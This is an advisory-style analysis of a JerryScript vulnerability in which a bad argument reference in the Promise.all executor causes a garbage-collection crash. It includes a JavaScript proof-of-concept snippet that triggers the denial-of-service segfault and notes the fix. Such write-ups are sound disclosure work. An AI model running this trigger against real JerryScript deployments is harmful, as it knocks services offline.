Based on the provided information, here's an analysis of the vulnerability:

**Root cause of vulnerability:**
- An invalid argument reference in the `Promise.all` executor within the JerryScript engine.

**Weaknesses/vulnerabilities present:**
- The vulnerability manifests as a segmentation fault (SEGV) during garbage collection, specifically within the `ecma_ref_object_inline` function.
- The issue stems from incorrect handling of object references within the `Promise.all` implementation.
- The crash happens when processing a promise reaction job, related to joining an array during string conversion of a Promise.all result.

**Impact of exploitation:**
- The vulnerability leads to a denial of service (DoS) by causing the JerryScript engine to crash.
- The crash is caused by a read of memory at an invalid address, which is identified by AddressSanitizer.

**Attack vectors:**
- The vulnerability can be triggered by executing specifically crafted JavaScript code that utilizes `Promise.all`.
- The provided code example demonstrates how to trigger the vulnerability with the following snippet
```javascript
function echo(str) {
  console.log(str);
}

function T(p, r, u) {
  return Object.assign(p, {
    then(onFulfilled, onRejected) {
      if (u) {
        onFulfilled(r);
      } else {
        onFulfilled();
      }

      return Promise.prototype.then.call(this, onFulfilled, onRejected);
    }
  });
}

function JSEtest(i) {
  var ps = [T(Promise.resolve('success'))];
  Promise.all(ps).then(res => {
    echo(`Test #${i} - Success with '${res}' (length = ${res.length}) (isArray = ${Array.isArray(res)})`);
  }).catch(err => {
    echo(`Test #${i} - Catch with ${err}`);
  });
}

JSEtest(1);
```

**Required attacker capabilities/position:**
- An attacker needs the ability to execute arbitrary JavaScript code within a JerryScript environment to trigger the vulnerability.

**Additional Details:**
- The provided stack trace pinpoints the issue to `ecma_ref_object_inline` in `ecma-gc.c` which suggests a problem with garbage collection and object reference management.
- The vulnerability was fixed by correcting the invalid argument reference in the `Promise.all` executor.
- The fix was merged via pull request #4885.
- The issue was found by the OWL337 team.
